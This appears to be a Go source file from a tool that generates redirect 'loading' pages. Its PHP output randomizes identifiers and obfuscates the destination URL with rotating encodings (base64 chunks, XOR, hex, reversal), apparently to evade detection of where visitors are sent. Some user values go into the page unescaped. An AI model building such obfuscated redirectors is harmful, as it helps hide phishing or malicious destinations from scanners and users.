// pkg/customizer/generator.go
package customizer

import (
	"fmt"
	"html"
	"strings"
)

// GenerateHTML produces a complete self-contained HTML page based on the options
func GenerateHTML(opts GenerateOptions) string {
	c := opts.Customization

	var b strings.Builder

	// Page title
	pageTitle := c.PageTitle
	if pageTitle == "" {
		pageTitle = "Loading..."
	}

	// Build the HTML
	b.WriteString("<!DOCTYPE html>\n")
	b.WriteString("<html lang=\"en\">\n")
	b.WriteString("<head>\n")
	b.WriteString("  <meta charset=\"UTF-8\">\n")
	b.WriteString("  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n")
	b.WriteString(fmt.Sprintf("  <title>%s</title>\n", html.EscapeString(pageTitle)))

	// Google Font link
	fontURL := buildFontURL(c.Font, c.FontWeight)
	if fontURL != "" {
		b.WriteString(fmt.Sprintf("  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n"))
		b.WriteString(fmt.Sprintf("  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n"))
		b.WriteString(fmt.Sprintf("  <link href=\"%s\" rel=\"stylesheet\">\n", fontURL))
	}

	// Inline CSS
	b.WriteString("  <style>\n")
	b.WriteString(buildCSS(c))
	b.WriteString("  </style>\n")
	b.WriteString("</head>\n")

	// Body
	b.WriteString("<body>\n")
	b.WriteString(buildBody(c))

	// Redirect script (if redirect URL is provided)
	if opts.RedirectURL != "" && opts.Delay > 0 {
		b.WriteString(buildRedirectScript(opts.RedirectURL, opts.Delay))
	}

	b.WriteString("</body>\n")
	b.WriteString("</html>\n")

	return b.String()
}

// buildFontURL constructs the Google Fonts URL for the given font
func buildFontURL(fontID string, weight int) string {
	if fontID == "" {
		return ""
	}

	// Find font definition
	for _, f := range fonts {
		if f.ID == fontID {
			// Determine which weights to load
			weights := []int{weight}
			// Always include the requested weight if available
			hasWeight := false
			for _, w := range f.Weights {
				if w == weight {
					hasWeight = true
					break
				}
			}
			if !hasWeight && len(f.Weights) > 0 {
				weights = []int{f.Weights[0]}
			}
			return GetFontImportURL(f.Name, weights)
		}
	}
	return ""
}

// buildCSS generates the complete CSS for the page
func buildCSS(c Customization) string {
	var b strings.Builder

	// CSS Variables for loader colors
	b.WriteString("    :root {\n")
	b.WriteString(fmt.Sprintf("      --primary: %s;\n", c.LoaderColorPrimary))
	b.WriteString(fmt.Sprintf("      --secondary: %s;\n", c.LoaderColorSecondary))
	b.WriteString("    }\n\n")

	// Reset and base styles
	b.WriteString("    * { margin: 0; padding: 0; box-sizing: border-box; }\n\n")

	// Body styles with background
	b.WriteString("    body {\n")
	b.WriteString("      min-height: 100vh;\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      flex-direction: column;\n")
	b.WriteString("      align-items: center;\n")

	// Vertical position: vPos is -30 to +30 where 0 is center
	// Negative = higher (towards top), Positive = lower (towards bottom)
	vPos := c.VPos
	if vPos < -10 {
		// Top area
		b.WriteString("      justify-content: flex-start;\n")
		padding := 10 + (vPos + 30) // -30 -> 10%, -10 -> 30%
		b.WriteString(fmt.Sprintf("      padding-top: %d%%;\n", padding))
	} else if vPos > 10 {
		// Bottom area
		b.WriteString("      justify-content: flex-end;\n")
		padding := 10 + (30 - vPos) // +30 -> 10%, +10 -> 30%
		b.WriteString(fmt.Sprintf("      padding-bottom: %d%%;\n", padding))
	} else {
		// Center area (-10 to +10)
		b.WriteString("      justify-content: center;\n")
		if vPos != 0 {
			// Fine-tune center position with transform
			b.WriteString(fmt.Sprintf("      transform: translateY(%d%%);\n", vPos*2))
		}
	}

	// Background (solid or gradient)
	if c.GradientEnabled && c.BgColorSecondary != "" {
		b.WriteString(fmt.Sprintf("      background: linear-gradient(135deg, %s 0%%, %s 100%%);\n", c.BgColor, c.BgColorSecondary))
	} else {
		b.WriteString(fmt.Sprintf("      background: %s;\n", c.BgColor))
	}

	// Font family
	fontFamily := getFontFamily(c.Font)
	if fontFamily != "" {
		b.WriteString(fmt.Sprintf("      font-family: '%s', sans-serif;\n", fontFamily))
	}

	b.WriteString("      overflow: hidden;\n")
	b.WriteString("      position: relative;\n")
	b.WriteString("    }\n\n")

	// Pattern overlay
	if c.Pattern != "" && c.Pattern != "none" {
		patternSVG := GetPatternSVG(c.Pattern, c.PatternColor, c.PatternOpacity)
		if patternSVG != "" {
			b.WriteString("    body::before {\n")
			b.WriteString("      content: '';\n")
			b.WriteString("      position: absolute;\n")
			b.WriteString("      inset: 0;\n")
			b.WriteString(fmt.Sprintf("      background-image: url(\"%s\");\n", patternSVG))
			b.WriteString("      background-repeat: repeat;\n")
			b.WriteString("      pointer-events: none;\n")
			b.WriteString("      z-index: 0;\n")
			b.WriteString("    }\n\n")
		}
	}

	// Background image overlay
	if c.ImageMode == "background" && c.ImageDataURL != "" {
		b.WriteString("    body::after {\n")
		b.WriteString("      content: '';\n")
		b.WriteString("      position: absolute;\n")
		b.WriteString("      inset: 0;\n")
		b.WriteString(fmt.Sprintf("      background-image: url(\"%s\");\n", c.ImageDataURL))
		b.WriteString("      background-size: cover;\n")
		b.WriteString("      background-position: center;\n")
		if c.ImageOverlay > 0 {
			overlayOpacity := float64(c.ImageOverlay) / 100.0
			b.WriteString(fmt.Sprintf("      opacity: %.2f;\n", 1.0-overlayOpacity))
		}
		b.WriteString("      pointer-events: none;\n")
		b.WriteString("      z-index: 0;\n")
		b.WriteString("    }\n\n")
	}

	// Content container
	b.WriteString("    .content {\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      flex-direction: column;\n")
	b.WriteString("      align-items: center;\n")
	gap := c.Gap
	if gap == 0 {
		gap = 20 // default gap
	}
	b.WriteString(fmt.Sprintf("      gap: %dpx;\n", gap))
	b.WriteString("      z-index: 1;\n")
	b.WriteString("      position: relative;\n")

	// Text alignment
	textAlign := c.TextAlign
	if textAlign == "" {
		textAlign = "center"
	}
	b.WriteString(fmt.Sprintf("      text-align: %s;\n", textAlign))
	b.WriteString("    }\n\n")

	// Logo/image styles
	if c.ImageMode == "logo" && c.ImageDataURL != "" {
		imageSize := c.ImageSize
		if imageSize == 0 {
			imageSize = 100
		}
		b.WriteString("    .logo {\n")
		b.WriteString(fmt.Sprintf("      width: %dpx;\n", imageSize))
		b.WriteString(fmt.Sprintf("      height: %dpx;\n", imageSize))
		b.WriteString("      object-fit: contain;\n")
		b.WriteString("    }\n\n")
	}

	// Text styles
	textSize := c.TextSize
	if textSize == 0 {
		textSize = 24
	}
	fontWeight := c.FontWeight
	if fontWeight == 0 {
		fontWeight = 400
	}

	b.WriteString("    .heading {\n")
	b.WriteString(fmt.Sprintf("      font-size: %dpx;\n", textSize))
	b.WriteString(fmt.Sprintf("      font-weight: %d;\n", fontWeight))
	b.WriteString(fmt.Sprintf("      color: %s;\n", c.TextColor))
	if c.TextShadow {
		b.WriteString("      text-shadow: 0 2px 4px rgba(0,0,0,0.3);\n")
	}
	b.WriteString("    }\n\n")

	b.WriteString("    .subheading {\n")
	subSize := textSize * 60 / 100
	if subSize < 12 {
		subSize = 12
	}
	b.WriteString(fmt.Sprintf("      font-size: %dpx;\n", subSize))
	b.WriteString(fmt.Sprintf("      font-weight: %d;\n", max(fontWeight-200, 300)))
	b.WriteString(fmt.Sprintf("      color: %s;\n", c.TextColor))
	b.WriteString("      opacity: 0.8;\n")
	if c.TextShadow {
		b.WriteString("      text-shadow: 0 1px 2px rgba(0,0,0,0.2);\n")
	}
	b.WriteString("    }\n\n")

	// Loader styles
	b.WriteString("    .loader-container {\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      justify-content: center;\n")
	b.WriteString("      align-items: center;\n")
	b.WriteString("    }\n\n")

	// Include selected loader CSS
	if c.Loader != "" {
		loaderCSS := GetLoaderCSS(c.Loader)
		if loaderCSS != "" {
			b.WriteString("    ")
			b.WriteString(strings.ReplaceAll(loaderCSS, "\n", "\n    "))
			b.WriteString("\n")
		}
	}

	return b.String()
}

// getFontFamily returns the display name for a font ID
func getFontFamily(fontID string) string {
	for _, f := range fonts {
		if f.ID == fontID {
			return f.Name
		}
	}
	return ""
}

// buildBody generates the body content HTML
func buildBody(c Customization) string {
	var b strings.Builder

	// Content container
	b.WriteString("  <div class=\"content\">\n")

	// Determine content order
	order := c.ContentOrder
	if order == "" {
		order = "loader-text" // default order
	}

	// Parse the order
	parts := strings.Split(order, "-")
	for _, part := range parts {
		switch part {
		case "loader":
			if c.Loader != "" {
				loaderHTML := GetLoaderHTML(c.Loader)
				if loaderHTML != "" {
					b.WriteString("    <div class=\"loader-container\">\n")
					b.WriteString(fmt.Sprintf("      %s\n", loaderHTML))
					b.WriteString("    </div>\n")
				}
			}
		case "text":
			// Heading
			if c.HeadingVisible && c.Heading != "" {
				b.WriteString(fmt.Sprintf("    <h1 class=\"heading\">%s</h1>\n", html.EscapeString(c.Heading)))
			}
			// Subheading
			if c.SubheadingVisible && c.Subheading != "" {
				b.WriteString(fmt.Sprintf("    <p class=\"subheading\">%s</p>\n", html.EscapeString(c.Subheading)))
			}
		case "logo", "image":
			if c.ImageMode == "logo" && c.ImageDataURL != "" {
				b.WriteString(fmt.Sprintf("    <img class=\"logo\" src=\"%s\" alt=\"Logo\">\n", c.ImageDataURL))
			}
		}
	}

	// Handle cases where image/logo might not be in the order string
	if c.ImageMode == "logo" && c.ImageDataURL != "" && !strings.Contains(order, "logo") && !strings.Contains(order, "image") {
		b.WriteString(fmt.Sprintf("    <img class=\"logo\" src=\"%s\" alt=\"Logo\">\n", c.ImageDataURL))
	}

	b.WriteString("  </div>\n")

	return b.String()
}

// buildRedirectScript generates the JavaScript for redirect
func buildRedirectScript(url string, delaySeconds int) string {
	var b strings.Builder

	b.WriteString("  <script>\n")
	b.WriteString(fmt.Sprintf("    setTimeout(function() {\n"))
	b.WriteString(fmt.Sprintf("      window.location.href = %q;\n", url))
	b.WriteString(fmt.Sprintf("    }, %d);\n", delaySeconds*1000))
	b.WriteString("  </script>\n")

	return b.String()
}

// GeneratePHP produces a PHP file with per-request source code randomization.
// Each visitor sees different class names, variable names, and URL encoding.
func GeneratePHP(opts GenerateOptions) string {
	c := opts.Customization
	urls := opts.RedirectURLs
	if len(urls) == 0 && opts.RedirectURL != "" {
		urls = []string{opts.RedirectURL}
	}

	var b strings.Builder

	// PHP header with cache prevention and randomizer classes
	b.WriteString(`<?php
// Prevent browser caching of dynamically-generated content
header('Cache-Control: no-cache, no-store, must-revalidate');
header('Pragma: no-cache');
header('Expires: 0');

class SourceRandomizer {
    private $seed;
    private $classMap = [];
    private $varMap = [];

    public function __construct() {
        // Use file hash as seed - consistent per deploy, changes on redeploy
        $this->seed = substr(md5_file(__FILE__), 0, 8);
        // Seed PHP's random generator so rand()/array_rand() are also per-deploy
        mt_srand(crc32($this->seed));
    }

    public function className($key) {
        if (!isset($this->classMap[$key])) {
            $this->classMap[$key] = '_' . $this->seed . substr(md5($key . $this->seed), 0, 6);
        }
        return $this->classMap[$key];
    }

    public function varName($key) {
        if (!isset($this->varMap[$key])) {
            $this->varMap[$key] = '_0x' . substr(md5($key . $this->seed), 0, 8);
        }
        return $this->varMap[$key];
    }

    public function elementId($key) {
        return 'e' . $this->seed . substr(md5($key . $this->seed), 0, 4);
    }

    public function randomComment() {
        // All comments use seed-derived values for per-deploy consistency
        $comments = [
            '/* Build: ' . $this->seed . ' */',
            '// Session: ' . $this->seed,
            '/* v' . (crc32($this->seed) % 9 + 1) . '.' . (crc32($this->seed . 'a') % 100) . '.' . (crc32($this->seed . 'b') % 1000) . ' */',
        ];
        return $comments[array_rand($comments)];
    }
}

class URLEncoder {
    private $r;

    public function __construct($randomizer) {
        $this->r = $randomizer;
    }

    public function encode($url) {
        if (empty($url)) {
            $urlVar = $this->r->varName('url');
            return "var $urlVar='';";
        }
        $method = mt_rand(1, 6);
        $b64 = base64_encode($url);

        switch($method) {
            case 1: return $this->splitChunks($b64);
            case 2: return $this->charCodeArray($b64);
            case 3: return $this->xorEncode($b64);
            case 4: return $this->reversed($b64);
            case 5: return $this->hexEncode($b64);
            case 6: return $this->doubleEncode($url);
            default: return $this->doubleEncode($url);
        }
    }

    private function splitChunks($b64) {
        $chunks = str_split($b64, mt_rand(4, 8));
        $vars = [];
        $varNames = [];
        foreach ($chunks as $i => $chunk) {
            $vn = $this->r->varName("c$i");
            $varNames[] = $vn;
            $vars[] = "var $vn=\"$chunk\";";
        }
        $concat = implode('+', $varNames);
        $urlVar = $this->r->varName('url');
        return implode("\n", $vars) . "\nvar $urlVar=atob($concat);";
    }

    private function charCodeArray($b64) {
        $codes = [];
        for ($i = 0; $i < strlen($b64); $i++) {
            $codes[] = ord($b64[$i]);
        }
        $arrVar = $this->r->varName('arr');
        $urlVar = $this->r->varName('url');
        return "var $arrVar=[" . implode(',', $codes) . "];\nvar $urlVar=atob($arrVar.map(function(c){return String.fromCharCode(c)}).join(''));";
    }

    private function xorEncode($b64) {
        // Use seed-derived key for per-deploy consistency
        $key = substr(md5($this->r->varName('xor')), 0, 6);
        $encoded = [];
        for ($i = 0; $i < strlen($b64); $i++) {
            $encoded[] = ord($b64[$i]) ^ ord($key[$i % strlen($key)]);
        }
        $keyVar = $this->r->varName('k');
        $encVar = $this->r->varName('e');
        $decFunc = $this->r->varName('d');
        $urlVar = $this->r->varName('url');
        return "var $keyVar=\"$key\";\nvar $encVar=[" . implode(',', $encoded) . "];\nfunction $decFunc(e,k){var r='';for(var i=0;i<e.length;i++)r+=String.fromCharCode(e[i]^k.charCodeAt(i%k.length));return r;}\nvar $urlVar=atob($decFunc($encVar,$keyVar));";
    }

    private function reversed($b64) {
        $rev = strrev($b64);
        $revVar = $this->r->varName('rev');
        $urlVar = $this->r->varName('url');
        return "var $revVar=\"$rev\";\nvar $urlVar=atob($revVar.split('').reverse().join(''));";
    }

    private function hexEncode($b64) {
        $hex = bin2hex($b64);
        $hexVar = $this->r->varName('hex');
        $decFunc = $this->r->varName('hd');
        $urlVar = $this->r->varName('url');
        return "var $hexVar=\"$hex\";\nfunction $decFunc(h){var r='';for(var i=0;i<h.length;i+=2)r+=String.fromCharCode(parseInt(h.substr(i,2),16));return r;}\nvar $urlVar=atob($decFunc($hexVar));";
    }

    private function doubleEncode($url) {
        $double = base64_encode(base64_encode($url));
        $dblVar = $this->r->varName('dbl');
        $urlVar = $this->r->varName('url');
        return "var $dblVar=\"$double\";\nvar $urlVar=atob(atob($dblVar));";
    }
}

$r = new SourceRandomizer();
$encoder = new URLEncoder($r);
`)

	// URLs array - ensure at least one URL
	if len(urls) == 0 {
		urls = []string{"#"}
	}
	b.WriteString("$urls = [")
	for i, u := range urls {
		if i > 0 {
			b.WriteString(",")
		}
		b.WriteString(fmt.Sprintf("%q", u))
	}
	b.WriteString("];\n")
	b.WriteString("$destUrl = $urls[array_rand($urls)];\n")
	b.WriteString("$encodedScript = $encoder->encode($destUrl);\n")
	b.WriteString("$urlVar = $r->varName('url');\n")
	b.WriteString("?>\n")

	// Page title
	pageTitle := c.PageTitle
	if pageTitle == "" {
		pageTitle = "Loading..."
	}

	// HTML output
	b.WriteString("<!DOCTYPE html>\n")
	b.WriteString("<html lang=\"en\">\n")
	b.WriteString("<head>\n")
	b.WriteString("  <meta charset=\"UTF-8\">\n")
	b.WriteString("  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n")
	b.WriteString(fmt.Sprintf("  <title>%s</title>\n", html.EscapeString(pageTitle)))

	// Google Font link
	fontURL := buildFontURL(c.Font, c.FontWeight)
	if fontURL != "" {
		b.WriteString("  <link rel=\"preconnect\" href=\"https://fonts.googleapis.com\">\n")
		b.WriteString("  <link rel=\"preconnect\" href=\"https://fonts.gstatic.com\" crossorigin>\n")
		b.WriteString(fmt.Sprintf("  <link href=\"%s\" rel=\"stylesheet\">\n", fontURL))
	}

	// Inline CSS with PHP class substitution
	b.WriteString("  <style>\n")
	b.WriteString("<?php echo $r->randomComment(); ?>\n")
	b.WriteString(buildPHPCSS(c))
	b.WriteString("  </style>\n")
	b.WriteString("</head>\n")

	// Body with PHP class substitution
	b.WriteString("<body>\n")
	b.WriteString(buildPHPBody(c))

	// Redirect script
	delay := opts.Delay
	if delay <= 0 {
		delay = 3
	}
	b.WriteString("  <script>\n")
	b.WriteString("<?php echo $r->randomComment(); ?>\n")
	b.WriteString("<?php echo $encodedScript; ?>\n")
	b.WriteString(fmt.Sprintf("var <?php echo $r->varName('delay'); ?>=%d;\n", delay*1000))
	b.WriteString("var <?php echo $r->varName('timer'); ?>=setTimeout(function(){\n")
	b.WriteString("  window.location.href=<?php echo $urlVar; ?>;\n")
	b.WriteString("},<?php echo $r->varName('delay'); ?>);\n")
	b.WriteString("  </script>\n")
	b.WriteString("</body>\n")
	b.WriteString("</html>\n")

	return b.String()
}

// buildPHPCSS generates CSS with PHP class name substitution
func buildPHPCSS(c Customization) string {
	var b strings.Builder

	// CSS Variables for loader colors
	b.WriteString("    :root {\n")
	b.WriteString(fmt.Sprintf("      --primary: %s;\n", c.LoaderColorPrimary))
	b.WriteString(fmt.Sprintf("      --secondary: %s;\n", c.LoaderColorSecondary))
	b.WriteString("    }\n\n")

	// Reset and base styles
	b.WriteString("    * { margin: 0; padding: 0; box-sizing: border-box; }\n\n")

	// Body styles with background
	b.WriteString("    body {\n")
	b.WriteString("      min-height: 100vh;\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      flex-direction: column;\n")
	b.WriteString("      align-items: center;\n")

	// Vertical position
	vPos := c.VPos
	if vPos < -10 {
		b.WriteString("      justify-content: flex-start;\n")
		padding := 10 + (vPos + 30)
		b.WriteString(fmt.Sprintf("      padding-top: %d%%;\n", padding))
	} else if vPos > 10 {
		b.WriteString("      justify-content: flex-end;\n")
		padding := 10 + (30 - vPos)
		b.WriteString(fmt.Sprintf("      padding-bottom: %d%%;\n", padding))
	} else {
		b.WriteString("      justify-content: center;\n")
		if vPos != 0 {
			b.WriteString(fmt.Sprintf("      transform: translateY(%d%%);\n", vPos*2))
		}
	}

	// Background
	if c.GradientEnabled && c.BgColorSecondary != "" {
		b.WriteString(fmt.Sprintf("      background: linear-gradient(135deg, %s 0%%, %s 100%%);\n", c.BgColor, c.BgColorSecondary))
	} else {
		b.WriteString(fmt.Sprintf("      background: %s;\n", c.BgColor))
	}

	// Font family
	fontFamily := getFontFamily(c.Font)
	if fontFamily != "" {
		b.WriteString(fmt.Sprintf("      font-family: '%s', sans-serif;\n", fontFamily))
	}

	b.WriteString("      overflow: hidden;\n")
	b.WriteString("      position: relative;\n")
	b.WriteString("    }\n\n")

	// Pattern overlay
	if c.Pattern != "" && c.Pattern != "none" {
		patternSVG := GetPatternSVG(c.Pattern, c.PatternColor, c.PatternOpacity)
		if patternSVG != "" {
			b.WriteString("    body::before {\n")
			b.WriteString("      content: '';\n")
			b.WriteString("      position: absolute;\n")
			b.WriteString("      inset: 0;\n")
			b.WriteString(fmt.Sprintf("      background-image: url(\"%s\");\n", patternSVG))
			b.WriteString("      background-repeat: repeat;\n")
			b.WriteString("      pointer-events: none;\n")
			b.WriteString("      z-index: 0;\n")
			b.WriteString("    }\n\n")
		}
	}

	// Background image overlay
	if c.ImageMode == "background" && c.ImageDataURL != "" {
		b.WriteString("    body::after {\n")
		b.WriteString("      content: '';\n")
		b.WriteString("      position: absolute;\n")
		b.WriteString("      inset: 0;\n")
		b.WriteString(fmt.Sprintf("      background-image: url(\"%s\");\n", c.ImageDataURL))
		b.WriteString("      background-size: cover;\n")
		b.WriteString("      background-position: center;\n")
		if c.ImageOverlay > 0 {
			overlayOpacity := float64(c.ImageOverlay) / 100.0
			b.WriteString(fmt.Sprintf("      opacity: %.2f;\n", 1.0-overlayOpacity))
		}
		b.WriteString("      pointer-events: none;\n")
		b.WriteString("      z-index: 0;\n")
		b.WriteString("    }\n\n")
	}

	// Content container - using PHP class names
	b.WriteString("    .<?php echo $r->className('content'); ?> {\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      flex-direction: column;\n")
	b.WriteString("      align-items: center;\n")
	gap := c.Gap
	if gap == 0 {
		gap = 20
	}
	b.WriteString(fmt.Sprintf("      gap: %dpx;\n", gap))
	b.WriteString("      z-index: 1;\n")
	b.WriteString("      position: relative;\n")
	textAlign := c.TextAlign
	if textAlign == "" {
		textAlign = "center"
	}
	b.WriteString(fmt.Sprintf("      text-align: %s;\n", textAlign))
	b.WriteString("    }\n\n")

	// Logo styles
	if c.ImageMode == "logo" && c.ImageDataURL != "" {
		imageSize := c.ImageSize
		if imageSize == 0 {
			imageSize = 100
		}
		b.WriteString("    .<?php echo $r->className('logo'); ?> {\n")
		b.WriteString(fmt.Sprintf("      width: %dpx;\n", imageSize))
		b.WriteString(fmt.Sprintf("      height: %dpx;\n", imageSize))
		b.WriteString("      object-fit: contain;\n")
		b.WriteString("    }\n\n")
	}

	// Text styles
	textSize := c.TextSize
	if textSize == 0 {
		textSize = 24
	}
	fontWeight := c.FontWeight
	if fontWeight == 0 {
		fontWeight = 400
	}

	b.WriteString("    .<?php echo $r->className('heading'); ?> {\n")
	b.WriteString(fmt.Sprintf("      font-size: %dpx;\n", textSize))
	b.WriteString(fmt.Sprintf("      font-weight: %d;\n", fontWeight))
	b.WriteString(fmt.Sprintf("      color: %s;\n", c.TextColor))
	if c.TextShadow {
		b.WriteString("      text-shadow: 0 2px 4px rgba(0,0,0,0.3);\n")
	}
	b.WriteString("    }\n\n")

	b.WriteString("    .<?php echo $r->className('subheading'); ?> {\n")
	subSize := textSize * 60 / 100
	if subSize < 12 {
		subSize = 12
	}
	b.WriteString(fmt.Sprintf("      font-size: %dpx;\n", subSize))
	b.WriteString(fmt.Sprintf("      font-weight: %d;\n", max(fontWeight-200, 300)))
	b.WriteString(fmt.Sprintf("      color: %s;\n", c.TextColor))
	b.WriteString("      opacity: 0.8;\n")
	if c.TextShadow {
		b.WriteString("      text-shadow: 0 1px 2px rgba(0,0,0,0.2);\n")
	}
	b.WriteString("    }\n\n")

	// Loader container
	b.WriteString("    .<?php echo $r->className('loaderContainer'); ?> {\n")
	b.WriteString("      display: flex;\n")
	b.WriteString("      justify-content: center;\n")
	b.WriteString("      align-items: center;\n")
	b.WriteString("    }\n\n")

	// Loader CSS (with PHP class substitution for the loader itself)
	if c.Loader != "" {
		loaderCSS := GetLoaderCSS(c.Loader)
		if loaderCSS != "" {
			// Replace .loader with PHP class name
			phpLoaderCSS := strings.ReplaceAll(loaderCSS, ".loader", ".<?php echo $r->className('loader'); ?>")
			b.WriteString("    ")
			b.WriteString(strings.ReplaceAll(phpLoaderCSS, "\n", "\n    "))
			b.WriteString("\n")
		}
	}

	return b.String()
}

// buildPHPBody generates the body HTML with PHP class substitution
func buildPHPBody(c Customization) string {
	var b strings.Builder

	// Content container
	b.WriteString("  <div class=\"<?php echo $r->className('content'); ?>\">\n")

	// Determine content order
	order := c.ContentOrder
	if order == "" {
		order = "loader-text"
	}

	// Parse the order
	parts := strings.Split(order, "-")
	for _, part := range parts {
		switch part {
		case "loader":
			if c.Loader != "" {
				loaderHTML := GetLoaderHTML(c.Loader)
				if loaderHTML != "" {
					// Replace class="loader" with PHP class name
					phpLoaderHTML := strings.ReplaceAll(loaderHTML, `class="loader"`, `class="<?php echo $r->className('loader'); ?>"`)
					b.WriteString("    <div class=\"<?php echo $r->className('loaderContainer'); ?>\">\n")
					b.WriteString(fmt.Sprintf("      %s\n", phpLoaderHTML))
					b.WriteString("    </div>\n")
				}
			}
		case "text":
			if c.HeadingVisible && c.Heading != "" {
				b.WriteString(fmt.Sprintf("    <h1 class=\"<?php echo $r->className('heading'); ?>\">%s</h1>\n", html.EscapeString(c.Heading)))
			}
			if c.SubheadingVisible && c.Subheading != "" {
				b.WriteString(fmt.Sprintf("    <p class=\"<?php echo $r->className('subheading'); ?>\">%s</p>\n", html.EscapeString(c.Subheading)))
			}
		case "logo", "image":
			if c.ImageMode == "logo" && c.ImageDataURL != "" {
				b.WriteString(fmt.Sprintf("    <img class=\"<?php echo $r->className('logo'); ?>\" src=\"%s\" alt=\"Logo\">\n", c.ImageDataURL))
			}
		}
	}

	// Handle cases where image/logo might not be in the order string
	if c.ImageMode == "logo" && c.ImageDataURL != "" && !strings.Contains(order, "logo") && !strings.Contains(order, "image") {
		b.WriteString(fmt.Sprintf("    <img class=\"<?php echo $r->className('logo'); ?>\" src=\"%s\" alt=\"Logo\">\n", c.ImageDataURL))
	}

	b.WriteString("  </div>\n")

	return b.String()
}
